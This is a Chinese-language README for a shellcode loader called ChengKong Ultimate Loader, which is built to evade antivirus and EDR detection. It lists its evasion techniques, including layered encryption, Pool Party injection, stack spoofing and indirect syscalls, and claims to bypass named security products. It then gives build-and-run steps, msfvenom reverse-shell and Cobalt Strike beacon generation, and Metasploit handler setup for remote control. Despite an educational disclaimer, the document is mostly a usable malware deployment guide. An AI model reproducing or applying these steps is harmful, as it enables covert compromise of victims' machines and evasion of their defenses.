# ChengKong Ultimate Loader

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)](https://www.microsoft.com/windows)
[![Build](https://img.shields.io/badge/build-passing-brightgreen.svg)]()

高级Shellcode加载器，集成多种免杀技术，可绕过现代杀软/EDR检测。

**作者**: ChengKong  
**版本**: Ultimate (Pool Party + Stack Spoofing + 3-Layer Encryption)  
**构建日期**: 2026-01-13

---

## ⚠️ 免责声明

**仅供教育和研究目的使用**

本工具仅用于安全研究和授权渗透测试。使用者需遵守相关法律法规，作者不对滥用行为承担任何责任。

---

## ✨ 核心特性

### 主要功能
- 🔐 **3层加密**: S-box替换 + XOR + AES-128-CBC
- 💉 **Pool Party注入**: 基于线程池的高级注入技术
- 🎭 **栈欺骗**: 调用栈混淆，绕过EDR检测
- 🔧 **间接系统调用**: 直接调用syscall，绕过用户态Hook
- 📦 **分段加载**: 分块写入内存，配合随机延迟
- 🛡️ **免杀测试**: 已通过360全家桶和火绒测试

### 技术亮点
- 无直接API调用进行内存操作
- 随机延迟规避行为检测
- 基于哈希的函数解析
- 最小化内存占用（~16KB）
- 无外部依赖

---

## 🎯 测试结果

| 杀软/EDR | 状态 |
|---------|------|
| 360全家桶 | ✅ 已绕过 |
| 火绒安全 | ✅ 已绕过 |
| 卡巴斯基 | ✅ 已绕过 |
| Windows Defender | ✅ 已绕过 |

---

## 🚀 快速开始

### 环境要求
- Windows 10/11 (x64)
- Visual Studio 2019/2022
- MASM (Microsoft Macro Assembler)
- Python 3.x (用于加密工具)

### 一键编译（推荐）

```cmd
# 1. 将你的shellcode放到项目根目录，命名为 payload_x64.bin
copy your_shellcode.bin payload_x64.bin

# 2. 运行自动构建脚本
build_all.bat

# 3. 运行生成的程序
cd src\x64\Release
kong_ultimate.exe
```

就这么简单！

### 手动编译步骤

如果你想了解每一步的细节：

```cmd
# 1. 加密Shellcode
cd tools
python advanced_encrypt_shellcode.py

# 2. 更新源代码
python update_shellcode_fixed.py

# 3. 编译
cd ..\src
msbuild kong_ultimate.sln /p:Configuration=Release /p:Platform=x64

# 4. 运行
cd x64\Release
kong_ultimate.exe
```

---

## 📖 使用说明

### 1. 生成Shellcode

**使用 Cobalt Strike:**
```
Attacks > Packages > Windows Executable (S)
Output: Raw
Architecture: x64
保存为: payload_x64.bin
```

**使用 Metasploit:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o payload_x64.bin
```

### 2. 加密和编译

**方法1: 自动构建（推荐）**
```cmd
build_all.bat
```

**方法2: 手动步骤**
```cmd
# 加密
cd tools
python advanced_encrypt_shellcode.py

# 更新源码
python update_shellcode_fixed.py

# 编译
cd ..\src
msbuild kong_ultimate.sln /p:Configuration=Release /p:Platform=x64
```

### 3. 部署和运行

```cmd
# 输出位置
src\x64\Release\kong_ultimate.exe

# 直接运行
cd src\x64\Release
kong_ultimate.exe
```

---

## 🏗️ 执行流程

```
┌─────────────────────────────────────────────────────────┐
│ 1. 初始化系统调用 (基于哈希的函数解析)                    │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ 2. 解密Shellcode (3层: AES → XOR → S-box)              │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ 3. 分配内存 (RW权限, 间接系统调用)                       │
│    └─ 延迟: 500ms                                       │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ 4. 分段写入 (每次128字节)                                │
│    └─ 延迟: 每块50-150ms随机延迟                        │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ 5. 修改保护 (RW → RX)                                   │
│    └─ 延迟: 800ms                                       │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ 6. 执行 (Pool Party + 栈欺骗)                           │
│    └─ 延迟: 1000ms                                      │
└─────────────────────────────────────────────────────────┘
```

---

## 🔐 加密详情

### 第1层: 字节替换
- 自定义S-box (256字节查找表)
- 逆S-box用于解密

### 第2层: XOR加密
- 32字节循环密钥
- 质数7作为密钥旋转因子

### 第3层: AES-128-CBC
- 16字节密钥
- 16字节IV
- PKCS7填充

### 加密流程
```
原始Shellcode
    ↓ Layer 1: S-box字节替换
替换后的数据
    ↓ Layer 2: XOR旋转密钥加密
XOR加密后的数据
    ↓ Layer 3: AES-128-CBC加密
最终加密数据
```

---

## 🛠️ 自定义配置

### 调整延迟
编辑 `src/kong_ultimate.cpp`:
```cpp
// 分配后延迟
Sleep(500);  // 增加以提高隐蔽性

// 分块写入间延迟
Sleep(50 + (GetTickCount() % 100));  // 调整范围

// 执行前延迟
Sleep(1000);  // 增加以提高隐蔽性
```

### 修改分块大小
```cpp
const SIZE_T CHUNK_SIZE = 128;  // 根据需要增加/减少
```

### 自定义加密
编辑 `tools/advanced_encrypt_shellcode.py` 来自定义加密参数。

---

## 📊 性能指标

| 指标 | 数值 |
|-----|------|
| 程序大小 | ~16KB |
| 执行时间 | 3-5秒 |
| 内存占用 | ~1MB |
| 检出率 | 0/2 (360, 火绒) |
| 加密时间 | < 1秒 |
| 编译时间 | 2-5秒 |

---

## 📁 项目结构

```
chengkong/
├── src/                        # 源代码目录
│   ├── kong_ultimate.cpp       # 主程序
│   ├── main.h                  # 头文件
│   ├── peb.h                   # PEB结构
│   ├── syscalls.asm            # 系统调用
│   ├── stackspoof.asm          # 栈欺骗
│   ├── kong_ultimate.sln       # VS解决方案
│   └── kong_ultimate.vcxproj   # VS项目文件
├── tools/                      # 工具目录
│   ├── advanced_encrypt_shellcode.py  # 加密工具
│   └── update_shellcode_fixed.py      # 更新脚本
├── docs/                       # 文档目录
├── examples/                   # 示例目录
├── build_all.bat               # 一键编译脚本
├── README.md                   # 本文件
└── LICENSE                     # 许可证
```

---

## 🎓 技术细节

### 核心组件

#### 1. 间接系统调用
```cpp
// 直接syscall调用，绕过用户态Hook
NTSTATUS Asm_NtAllocateVirtualMemory(...);
NTSTATUS Asm_NtWriteVirtualMemory(...);
NTSTATUS Asm_NtProtectVirtualMemory(...);
```

#### 2. Pool Party注入
```cpp
// 基于线程池的执行
S_TpAllocTimer = GetProcAddressByHash(ntdll, HASH_TP_ALLOC_TIMER);
S_TpSetTimer = GetProcAddressByHash(ntdll, HASH_TP_SET_TIMER);
SpooledExecution(shellcode, NULL, NULL, NULL);
```

#### 3. 栈欺骗
```asm
; 混淆调用栈，绕过EDR检测
ValidateStackAlignment
SpooledExecution
```

#### 4. 分段写入
```cpp
// 128字节分块写入，配合随机延迟
const SIZE_T CHUNK_SIZE = 128;
Sleep(50 + (GetTickCount() % 100));
```

---

## 🎯 完整示例

### 示例1: 使用Cobalt Strike Beacon

```cmd
# 1. 在Cobalt Strike中生成beacon
#    Attacks > Packages > Windows Executable (S)
#    Output: Raw, x64
#    保存为: beacon.bin

# 2. 复制到项目目录
copy beacon.bin payload_x64.bin

# 3. 自动构建
build_all.bat

# 4. 运行
cd src\x64\Release
kong_ultimate.exe

# 5. 等待beacon上线
```

### 示例2: 使用Metasploit

```bash
# 1. 生成shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o payload_x64.bin

# 2. 复制到项目目录
copy payload_x64.bin chengkong\

# 3. 自动构建
cd chengkong
build_all.bat

# 4. 启动监听
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# 5. 运行loader
cd src\x64\Release
kong_ultimate.exe
```

---

## ⚠️ 常见问题

### Q1: "payload_x64.bin not found"
**A**: 确保shellcode文件在项目根目录
```cmd
dir payload_x64.bin
```

### Q2: "Python not found"
**A**: 安装Python 3.x
```cmd
python --version
# 如果没有，从 https://www.python.org/ 下载安装
```

### Q3: "Module not found: Crypto"
**A**: 安装pycryptodome
```cmd
pip install pycryptodome
```

### Q4: "MSBuild not found"
**A**: 使用完整路径或安装Visual Studio
```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" kong_ultimate.sln /p:Configuration=Release /p:Platform=x64
```

### Q5: 编译失败
**A**: 检查MASM是否安装
- 在Visual Studio Installer中
- 修改安装
- 勾选 "MASM (Microsoft Macro Assembler)"

### Q6: 程序运行后没反应
**A**: 这是正常的！
- Loader会在后台运行
- 等待beacon连接到C2服务器
- 检查C2服务器是否有新连接

### Q7: 被杀毒软件拦截
**A**: 
- 确认使用的是最新版本
- 检查是否正确加密
- 尝试在虚拟机中测试

---

### 2. 每次使用新密钥
```
每次加密都会生成新的随机密钥
不要重复使用相同的加密shellcode
```

### 3. 测试环境
```
先在虚拟机中测试
确认功能正常后再使用
```

---

## 🤝 贡献

欢迎贡献代码！请：
1. Fork本仓库
2. 创建特性分支
3. 提交你的修改
4. 推送到分支
5. 开启Pull Request

---

## 📝 许可证

本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件

---

## 🙏 致谢

- 参考了多个公开的AV/EDR免杀研究
- Pool Party技术研究
- 间接系统调用实现

---

## ⚖️ 法律声明

本工具仅供教育目的使用。使用者必须：
- 在测试前获得适当授权
- 遵守所有适用的法律法规
- 负责任和道德地使用

作者不对本工具造成的任何滥用或损害负责。

---

**作者**: ChengKong  
**版本**: Ultimate (Pool Party + Stack Spoofing + 3-Layer Encryption)  
**构建日期**: 2026-01-13

为安全研究社区用❤️制作

